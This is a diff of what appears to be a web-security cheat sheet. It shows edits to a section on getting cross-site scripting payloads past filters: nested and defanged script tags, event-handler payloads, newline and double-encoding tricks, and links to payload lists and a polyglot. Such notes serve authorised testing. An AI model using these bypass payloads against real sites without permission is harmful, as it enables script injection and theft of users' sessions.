@@ -50,8 +50,8 @@ is it being blocked due to the spaces? remove all spaces from the attack payload
 <br>
 <h2>XSS Filter Bypasses</h2> <br>
 <b>Remove . from all payloads</b> <br>
-Is <.script>alert(1)</script.> filtered? Try: <br>
-<.scr<.script>ipt>alert(1)<./scr</script.>ipt> <br>
+Is <.script>alert(1)<./script.> filtered? Try: <br>
+<.scr<.script>ipt>alert(1)<./scr<./script.>ipt> <br>
 <.img src=x onerror=alert(1)> <br>
 <.svg/onload=alert(1)> <br>
 <.h1 id=x onpointermove=alert(1)>test<./h1> <br>
@@ -62,12 +62,12 @@ Is <.script>alert(1)</script.> filtered? Try: <br>
  <br>
 Run through the payload list here on intruder and select grep for url decoded values https://github.com/payloadbox/xss-payload-list/blob/master/Intruder/xss-payload-list.txt <br>
  <br>
-< and > can be replace with html entities - https://www.web2generators.com/html-based-tools/online-html-entities-encoder-and-decoder <br>
+< and > can be replace with html and URL entities - https://www.web2generators.com/html-based-tools/online-html-entities-encoder-and-decoder <br>
  <br>
 You can try an XSS polyglot <br>
  https://gist.github.com/michenriksen/d729cd67736d750b3551876bbedbe626<br>
  <br>
-Try New Lines to break the firewall - newline URL encoded is %0 - <.script>%0alert(1)</script> - try with different HTML tags <br>
+If you have HTML Injection on a tag that is not useful, try New Lines to break the firewall on an malicious tag - newline URL encoded is %0 - <.script>%0alert(1)<./script> - try with different HTML tags <br>
  <br>
 Try double encoding a newline break %2522 <br> 
  <br>
